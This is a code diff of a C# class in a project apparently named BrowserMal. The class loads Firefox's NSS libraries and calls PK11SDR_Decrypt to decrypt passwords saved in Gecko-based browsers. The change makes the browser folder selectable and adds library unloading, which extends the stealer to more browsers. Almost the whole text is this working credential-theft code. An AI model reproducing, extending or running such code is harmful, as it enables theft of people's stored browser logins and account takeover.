@@ -8,9 +8,10 @@ namespace BrowserMal.Encryption
 {
     public class GeckoDecryption
     {
-        private static IntPtr Nss3Lib;
-        private static readonly string ROOT = @"Mozilla Firefox";
-        private static readonly List<string> PROGRAM_FOLDERS = new List<string>()
+        private IntPtr Nss3Lib;
+        private IntPtr Mozglue;
+        private readonly string ROOT = @"Mozilla Firefox";
+        private readonly List<string> PROGRAM_FOLDERS = new List<string>()
         {
             Environment.ExpandEnvironmentVariables("%ProgramW6432%"),
             Environment.ExpandEnvironmentVariables("%ProgramFiles(x86)%")
@@ -24,14 +25,14 @@ namespace BrowserMal.Encryption
             public int SECItemLen;
         }
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern void FreeLibrary(IntPtr module);
+
         [DllImport("kernel32.dll")]
         public static extern IntPtr LoadLibrary(string dllFilePath);
         
         [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        /*[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);*/
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
@@ -39,11 +40,11 @@ namespace BrowserMal.Encryption
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate long DLLFunctionDelegate(string path);
 
-        private static string FindMozzilaFolder()
+        private string FindMozzilaFolder(string name)
         {
             foreach (string folder in PROGRAM_FOLDERS)
             {
-                string path = Path.Combine(folder, ROOT);
+                string path = Path.Combine(folder, name);
 
                 if (Directory.Exists(path))
                     return path;
@@ -52,14 +53,14 @@ namespace BrowserMal.Encryption
             return string.Empty;
         } 
 
-        public static void Init(string directory)
+        public void Init(string directory, string name)
         {
-            string mozillaPath = FindMozzilaFolder();
+            string mozillaPath = FindMozzilaFolder(name);
 
             if (string.IsNullOrEmpty(mozillaPath))
                 return;
 
-            LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
+            Mozglue = LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
             Nss3Lib = LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
 
             IntPtr pProc = GetProcAddress(Nss3Lib, "NSS_Init");
@@ -68,7 +69,7 @@ namespace BrowserMal.Encryption
             dll(directory);
         }
 
-        public static string Decrypt(string cypherText)
+        public string Decrypt(string cypherText)
         {
             IntPtr intPtr = IntPtr.Zero;
 
@@ -107,7 +108,16 @@ namespace BrowserMal.Encryption
             return string.Empty;
         }
 
-        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
+        public void Unload()
+        {
+            if (Nss3Lib != IntPtr.Zero)
+                FreeLibrary(Nss3Lib);
+
+            if (Mozglue != IntPtr.Zero)
+                FreeLibrary(Mozglue);
+        }
+
+        public int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
         {
             IntPtr procAddress = GetProcAddress(Nss3Lib, "PK11SDR_Decrypt");
             DLLFunctionDelegate5 dllfunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
